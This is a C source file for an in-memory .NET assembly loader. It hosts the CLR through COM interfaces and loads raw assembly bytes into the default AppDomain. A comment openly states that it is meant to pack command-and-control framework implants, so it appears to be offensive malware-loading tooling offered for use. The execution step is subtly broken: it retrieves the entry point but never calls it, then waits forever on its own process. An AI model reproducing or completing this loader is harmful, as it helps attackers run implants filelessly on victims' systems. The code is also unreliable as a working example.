#include <windows.h>
#include <stdio.h>
#include <mscoree.h>
#ifdef __MINGW32__ 
    // Manually add if using mingw
    #include "metahost.h" 
#else
    #include <metahost.h>
    #pragma comment(lib, "mscoree.lib")
#endif

IID _CLSID_CLRMetaHost    = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
IID _CLSID_CorRuntimeHost = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };
IID _IID_AppDomain        = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } };
IID _IID_ICLRMetaHost     = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } };
IID _IID_ICLRRuntimeInfo  = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } };
IID _IID_ICorRuntimeHost  = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };

typedef struct _AppDomain       IAppDomain;
typedef struct _Assembly        IAssembly;
typedef struct _MethodInfo      IMethodInfo;
typedef struct _Type            IType;

#undef DUMMY_METHOD
#define DUMMY_METHOD(x) HRESULT ( STDMETHODCALLTYPE *dummy_##x )(IAssembly *This)

typedef struct _AssemblyVtbl {
    BEGIN_INTERFACE

    HRESULT(STDMETHODCALLTYPE* QueryInterface)(
        IAssembly* This,
        REFIID riid,
        void** ppvObject);

    ULONG(STDMETHODCALLTYPE* AddRef)(
        IAssembly* This);

    ULONG(STDMETHODCALLTYPE* Release)(
        IAssembly* This);

    DUMMY_METHOD(GetTypeInfoCount);
    DUMMY_METHOD(GetTypeInfo);
    DUMMY_METHOD(GetIDsOfNames);

    DUMMY_METHOD(Invoke);
    DUMMY_METHOD(ToString);
    DUMMY_METHOD(Equals);
    DUMMY_METHOD(GetHashCode);
    DUMMY_METHOD(GetType);
    DUMMY_METHOD(CodeBase);
    DUMMY_METHOD(EscapedCodeBase);
    DUMMY_METHOD(GetName);
    DUMMY_METHOD(GetName_2);
    DUMMY_METHOD(FullName);

    HRESULT(STDMETHODCALLTYPE* EntryPoint)(
        IAssembly* This,
        IMethodInfo** pRetVal);

    HRESULT(STDMETHODCALLTYPE* GetType_2)(
        IAssembly* This,
        BSTR        name,
        IType** pRetVal);

    DUMMY_METHOD(GetType_3);
    DUMMY_METHOD(GetExportedTypes);
    DUMMY_METHOD(GetTypes);
    DUMMY_METHOD(GetManifestResourceStream);
    DUMMY_METHOD(GetManifestResourceStream_2);
    DUMMY_METHOD(GetFile);
    DUMMY_METHOD(GetFiles);
    DUMMY_METHOD(GetFiles_2);
    DUMMY_METHOD(GetManifestResourceNames);
    DUMMY_METHOD(GetManifestResourceInfo);
    DUMMY_METHOD(Location);
    DUMMY_METHOD(Evidence);
    DUMMY_METHOD(GetCustomAttributes);
    DUMMY_METHOD(GetCustomAttributes_2);
    DUMMY_METHOD(IsDefined);
    DUMMY_METHOD(GetObjectData);
    DUMMY_METHOD(add_ModuleResolve);
    DUMMY_METHOD(remove_ModuleResolve);
    DUMMY_METHOD(GetType_4);
    DUMMY_METHOD(GetSatelliteAssembly);
    DUMMY_METHOD(GetSatelliteAssembly_2);
    DUMMY_METHOD(LoadModule);
    DUMMY_METHOD(LoadModule_2);
    DUMMY_METHOD(CreateInstance);
    DUMMY_METHOD(CreateInstance_2);
    DUMMY_METHOD(CreateInstance_3);
    DUMMY_METHOD(GetLoadedModules);
    DUMMY_METHOD(GetLoadedModules_2);
    DUMMY_METHOD(GetModules);
    DUMMY_METHOD(GetModules_2);
    DUMMY_METHOD(GetModule);
    DUMMY_METHOD(GetReferencedAssemblies);
    DUMMY_METHOD(GlobalAssemblyCache);

    END_INTERFACE
} AssemblyVtbl;

typedef enum _BindingFlags {
    BindingFlags_Default = 0,
    BindingFlags_IgnoreCase = 1,
    BindingFlags_DeclaredOnly = 2,
    BindingFlags_Instance = 4,
    BindingFlags_Static = 8,
    BindingFlags_Public = 16,
    BindingFlags_NonPublic = 32,
    BindingFlags_FlattenHierarchy = 64,
    BindingFlags_InvokeMethod = 256,
    BindingFlags_CreateInstance = 512,
    BindingFlags_GetField = 1024,
    BindingFlags_SetField = 2048,
    BindingFlags_GetProperty = 4096,
    BindingFlags_SetProperty = 8192,
    BindingFlags_PutDispProperty = 16384,
    BindingFlags_PutRefDispProperty = 32768,
    BindingFlags_ExactBinding = 65536,
    BindingFlags_SuppressChangeType = 131072,
    BindingFlags_OptionalParamBinding = 262144,
    BindingFlags_IgnoreReturn = 16777216
} BindingFlags;

typedef struct _Assembly {
    AssemblyVtbl* lpVtbl;
} Assembly, * PAssembly;

#undef DUMMY_METHOD
#define DUMMY_METHOD(x) HRESULT ( STDMETHODCALLTYPE *dummy_##x )(IAppDomain *This)

typedef struct _AppDomainVtbl {
    BEGIN_INTERFACE

    HRESULT(STDMETHODCALLTYPE* QueryInterface)(
        IAppDomain* This,
        REFIID riid,
        void** ppvObject);

    ULONG(STDMETHODCALLTYPE* AddRef)(
        IAppDomain* This);

    ULONG(STDMETHODCALLTYPE* Release)(
        IAppDomain* This);

    DUMMY_METHOD(GetTypeInfoCount);
    DUMMY_METHOD(GetTypeInfo);
    DUMMY_METHOD(GetIDsOfNames);
    DUMMY_METHOD(Invoke);

    DUMMY_METHOD(ToString);
    DUMMY_METHOD(Equals);
    DUMMY_METHOD(GetHashCode);
    DUMMY_METHOD(GetType);
    DUMMY_METHOD(InitializeLifetimeService);
    DUMMY_METHOD(GetLifetimeService);
    DUMMY_METHOD(Evidence);
    DUMMY_METHOD(add_DomainUnload);
    DUMMY_METHOD(remove_DomainUnload);
    DUMMY_METHOD(add_AssemblyLoad);
    DUMMY_METHOD(remove_AssemblyLoad);
    DUMMY_METHOD(add_ProcessExit);
    DUMMY_METHOD(remove_ProcessExit);
    DUMMY_METHOD(add_TypeResolve);
    DUMMY_METHOD(remove_TypeResolve);
    DUMMY_METHOD(add_ResourceResolve);
    DUMMY_METHOD(remove_ResourceResolve);
    DUMMY_METHOD(add_AssemblyResolve);
    DUMMY_METHOD(remove_AssemblyResolve);
    DUMMY_METHOD(add_UnhandledException);
    DUMMY_METHOD(remove_UnhandledException);
    DUMMY_METHOD(DefineDynamicAssembly);
    DUMMY_METHOD(DefineDynamicAssembly_2);
    DUMMY_METHOD(DefineDynamicAssembly_3);
    DUMMY_METHOD(DefineDynamicAssembly_4);
    DUMMY_METHOD(DefineDynamicAssembly_5);
    DUMMY_METHOD(DefineDynamicAssembly_6);
    DUMMY_METHOD(DefineDynamicAssembly_7);
    DUMMY_METHOD(DefineDynamicAssembly_8);
    DUMMY_METHOD(DefineDynamicAssembly_9);
    DUMMY_METHOD(CreateInstance);
    DUMMY_METHOD(CreateInstanceFrom);
    DUMMY_METHOD(CreateInstance_2);
    DUMMY_METHOD(CreateInstanceFrom_2);
    DUMMY_METHOD(CreateInstance_3);
    DUMMY_METHOD(CreateInstanceFrom_3);
    DUMMY_METHOD(Load);
    DUMMY_METHOD(Load_2);

    HRESULT(STDMETHODCALLTYPE* Load_3)(
        IAppDomain* This,
        SAFEARRAY* rawAssembly,
        IAssembly** pRetVal);

    DUMMY_METHOD(Load_4);
    DUMMY_METHOD(Load_5);
    DUMMY_METHOD(Load_6);
    DUMMY_METHOD(Load_7);
    DUMMY_METHOD(ExecuteAssembly);
    DUMMY_METHOD(ExecuteAssembly_2);
    DUMMY_METHOD(ExecuteAssembly_3);
    DUMMY_METHOD(FriendlyName);
    DUMMY_METHOD(BaseDirectory);
    DUMMY_METHOD(RelativeSearchPath);
    DUMMY_METHOD(ShadowCopyFiles);
    DUMMY_METHOD(GetAssemblies);
    DUMMY_METHOD(AppendPrivatePath);
    DUMMY_METHOD(ClearPrivatePath);
    DUMMY_METHOD(SetShadowCopyPath);
    DUMMY_METHOD(ClearShadowCopyPath);
    DUMMY_METHOD(SetCachePath);
    DUMMY_METHOD(SetData);
    DUMMY_METHOD(GetData);
    DUMMY_METHOD(SetAppDomainPolicy);
    DUMMY_METHOD(SetThreadPrincipal);
    DUMMY_METHOD(SetPrincipalPolicy);
    DUMMY_METHOD(DoCallBack);
    DUMMY_METHOD(DynamicDirectory);

    END_INTERFACE
} AppDomainVtbl;

typedef struct _AppDomain {
    AppDomainVtbl* lpVtbl;
} AppDomain, * PAppDomain;

#ifdef VERBOSE
    #define DBG(...) printf(__VA_ARGS__ "\n")
#else
    #define DBG(...)
#endif

/**
 * Execute the specified assembly in memory via the CLR COM interface.
 */
VOID
RunDotnetAssembly(LPVOID pBytes, SIZE_T size)
{
    // Create safearray holding assembly data
    PCHAR assemblyData = (PCHAR)pBytes;
    PCHAR pData;
    SAFEARRAYBOUND bound[1];
    bound[0].cElements = size;
    bound[0].lLbound   = 0;

    SAFEARRAY* saData = SafeArrayCreate(VT_UI1, 1, bound);
    if (saData == NULL) 
    {
        DBG("[*] Failed to create SAFEARRAY");
        free(assemblyData); 
        return; 
    }

    if (FAILED(SafeArrayAccessData(saData, (PVOID*)&pData))) 
    {
        DBG("[*] Failed to access SAFEARRAY data");
        SafeArrayDestroy(saData);
        free(assemblyData); 
        return; 
    }

    RtlCopyMemory(pData, assemblyData, size);

    if (FAILED(SafeArrayUnaccessData(saData))) 
    {
        DBG("[*] Failed to unaccess SAFEARRAY data\n");
        SafeArrayDestroy(saData);
        free(assemblyData); 
        return; 
    }

    // --------------------------------------------------------------------------------------
  
    ICLRMetaHost*    pMetaHost         = NULL;
    IEnumUnknown*    pRuntime          = NULL;
    IUnknown*        pEnumRuntime      = NULL;
    ICLRRuntimeInfo* pRuntimeInfo      = NULL;
    ICorRuntimeHost* pRuntimeHost      = NULL;
    IUnknown*        pAppDomainThunk   = NULL;
    IAssembly*       pAssembly         = NULL;
    IMethodInfo*     pInfo             = NULL;
    AppDomain*       pDefaultAppDomain = NULL;

    // Create an CLR Instance
    if (FAILED(CLRCreateInstance(&_CLSID_CLRMetaHost, &_IID_ICLRMetaHost, (LPVOID*)&pMetaHost)))
    {
        DBG("[!] Error running CLRCreateInstance");
        SafeArrayDestroy(saData);
        free(assemblyData); 
        return;
    }

    // Enumerate pRuntimes
    if (FAILED(pMetaHost->lpVtbl->EnumerateInstalledRuntimes(pMetaHost, &pRuntime)))
    {
        DBG("[!] Error running EnumerateInstalledRuntimes");
        SafeArrayDestroy(saData);
        free(assemblyData); 
        return;
    }

    // Enumerate through pRuntimes and show supported frameworks
    DWORD bytes          = 2048;
    LPWSTR frameworkName = (LPWSTR)malloc(2048);
    while (pRuntime->lpVtbl->Next(pRuntime, 1, &pEnumRuntime, 0) == S_OK)
    {
        if (pEnumRuntime->lpVtbl->QueryInterface(pEnumRuntime, &_IID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo) == S_OK)
        {
            if (pRuntimeInfo != NULL)
            {
                pRuntimeInfo->lpVtbl->GetVersionString(pRuntimeInfo, frameworkName, &bytes);
                printf("[*] Supported framework: %ls\n", (PWCHAR)frameworkName);
            }
        }
    }

    if (!pRuntimeInfo)
    {
        DBG("[*] No runtime info found");
        SafeArrayDestroy(saData);
        free(assemblyData); 
        return ;
    }

    // Use the last supported runtime
    if (FAILED(pRuntimeInfo->lpVtbl->GetInterface(pRuntimeInfo, &_CLSID_CorRuntimeHost, &_IID_ICorRuntimeHost, (LPVOID*)&pRuntimeHost)))
    {
        DBG("[!] Failed to get interface");
        SafeArrayDestroy(saData);
        free(assemblyData); 
        return;
    }
    printf("[*] Using runtime: %ls\n", (PWCHAR)frameworkName);

    // Start the runtime
    if (FAILED(pRuntimeHost->lpVtbl->Start(pRuntimeHost))) 
    {
        DBG("[!] Failed starting runtime");
        SafeArrayDestroy(saData);
        free(assemblyData); 
        return;
    }

    // Get the default appdomain
    if (FAILED(pRuntimeHost->lpVtbl->GetDefaultDomain(pRuntimeHost, &pAppDomainThunk)))
    {
        DBG("[!] Failed to get default domain");
        SafeArrayDestroy(saData);
        free(assemblyData); 
        return;
    }
  
    if (FAILED(pAppDomainThunk->lpVtbl->QueryInterface(pAppDomainThunk, &_IID_AppDomain, (LPVOID*)&pDefaultAppDomain))) 
    {
        DBG("[!] Failed to query iface");
        SafeArrayDestroy(saData);
        free(assemblyData); 
        return;
    }
    DBG("[*] Using default domain");

    // Load assembly
    if (FAILED(pDefaultAppDomain->lpVtbl->Load_3(pDefaultAppDomain, saData, &pAssembly)))
    {
        DBG("[!] Failed to load assembly");
        SafeArrayDestroy(saData);
        free(assemblyData); 
        return;
    }
    DBG("[*] Assembly loaded to appdomain");

    // +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ //
    // TODO FOR YOU: Add arguments and capture the output of the command. Right now this is only suitable to   //
    //               pack C2 framework implants that are written in .NET or any other assembly where you don't //
    //               need the output.                                                                          //
    // +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ //

    // Run main entrypoint
    DBG("[*] Running assembly Main() entrypoint");
    if (FAILED(pAssembly->lpVtbl->EntryPoint(pAssembly, &pInfo)))
    {
        SafeArrayDestroy(saData);
        free(assemblyData); 
        return;
    }

    WaitForSingleObject(GetCurrentProcess(), INFINITE);
    SafeArrayDestroy(saData);
    free(assemblyData); 
}
